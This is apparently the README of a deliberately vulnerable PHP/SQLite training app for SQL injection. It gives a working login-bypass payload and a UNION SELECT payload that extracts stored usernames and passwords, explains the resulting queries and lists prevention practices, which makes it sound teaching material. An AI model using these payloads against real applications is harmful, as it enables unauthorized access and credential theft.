# SQL Injection Demo

This demo showcases common SQL injection vulnerabilities using PHP and SQLite.

## Overview

This demonstration includes two classic SQL injection scenarios:

1. **Authentication Bypass**: Using `' OR 1=1;--` to bypass login authentication
2. **Data Extraction**: Using `UNION SELECT` to extract sensitive data from other tables

## Running the Demo

### Using Docker

1. Build and run the container:
   ```
   docker-compose up -d
   ```

2. Access the demo at: http://localhost:8080

### Without Docker

If you have PHP installed locally:

1. Navigate to the `www` directory
2. Start the PHP development server:
   ```
   php -S localhost:8080
   ```

3. Access the demo at: http://localhost:8080

## Demonstration Details

### Login Bypass (Authentication Bypass)

This demo shows how an attacker can bypass authentication when the application fails to properly sanitize user input. The vulnerability allows logging in as the first user in the database (usually an admin) without knowing the password.

**Login Page**: http://localhost:8080/login.php

**Attack Vector**: 
- Username: (anything)
- Password: `' OR 1=1;--`

**What happens**: The SQL query becomes:
```sql
SELECT id, username, is_admin FROM users WHERE username = 'anything' AND password = '' OR 1=1;--'
```

The `OR 1=1` makes the WHERE clause always evaluate to true, and the `--` comments out the rest of the query.

### UNION Attack (Data Extraction)

This demo shows how an attacker can use UNION-based SQL injection to extract data from other tables in the database.

**Products Page**: http://localhost:8080/products.php

**Attack Vector**: Search for:
```
' UNION SELECT null, username, password, null FROM users;--
```

**What happens**: The SQL query becomes:
```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%' UNION SELECT null, username, password, null FROM users;--%' OR description LIKE '%' UNION SELECT null, username, password, null FROM users;--%'
```

This causes the application to return user credentials in the product listing.

## Security Best Practices

To prevent SQL injection:

1. Use prepared statements with parameterized queries
2. Use an ORM (Object-Relational Mapping) library
3. Validate and sanitize user input
4. Apply the principle of least privilege for database accounts
5. Use stored procedures
6. Implement proper error handling to avoid exposing database details

## Educational Purpose Only

This application intentionally contains security vulnerabilities for educational purposes. Do not use these techniques on real applications without permission. 